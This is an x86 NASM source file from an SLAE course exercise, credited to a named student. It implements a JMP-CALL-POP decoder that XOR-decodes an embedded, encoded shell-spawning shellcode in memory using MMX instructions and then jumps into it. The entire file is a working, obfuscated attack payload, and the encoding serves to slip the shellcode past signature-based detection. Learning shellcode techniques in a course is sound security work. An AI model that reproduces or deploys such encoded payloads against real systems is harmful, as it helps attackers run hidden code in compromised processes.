; Filename: shell_xor-decoder.nasm
; Author:  Marco Lugo (SLAE-1031)
; Description: spawns a shell
;
; For the SecurityTube Linux Assembly Expert (SLAE) course
; Using the JMP-CALL-POP method, xor decodes the shellcode in memory
; Adapted to use MMX instructions
; The resulting shellcode is 66 bytes

global _start

section .text

_start:
        jmp step1 ; unconditional jump to step1

step2:
        pop edx ; retrieves the address of Shellcode
        xor ecx, ecx ; assigns 0x00 to ECX
        push 0xaaaaaaaa ; push 0xaaaaaaaa to the stack
        push 0xaaaaaaaa
        xor ecx, ecx ; assigns 0x00 to ECX
        mov cl, 0x04 ; assigns 0x04 to ECX

decode:
        movq mm0, qword [edx] ; move 8 bytes from edx into MMX register mm0
        pxor mm0, qword [esp], ; use the MMX xor operator with to xor the 8 bytes in mm0 with the 8 0xaa bytes in the stack
        movq [edx], mm0 ; put the xor'd bytes (decoded) back into edx
        add edx, 0x08 ; move to the next chunck of bytes in line to xor
        loop decode ; continue with the loop (jumps back to decode)

        jmp Shellcode ; with the shellcode now fully decoded, jump to it for execution

step1:
        call step2 ; jumps to step2 while pushing the address of Shellcode to the stack
        Shellcode: db 0x9b,0x6a,0xfa,0xc2,0xc4,0x85,0xd9,0xc2,0xc2,0x85,0x85,0xc8,0xc3,0x23,0x49,0xfa,0xf9,0x23,0x4b,0x9b,0x78,0x1a,0xa1,0x67,0x2a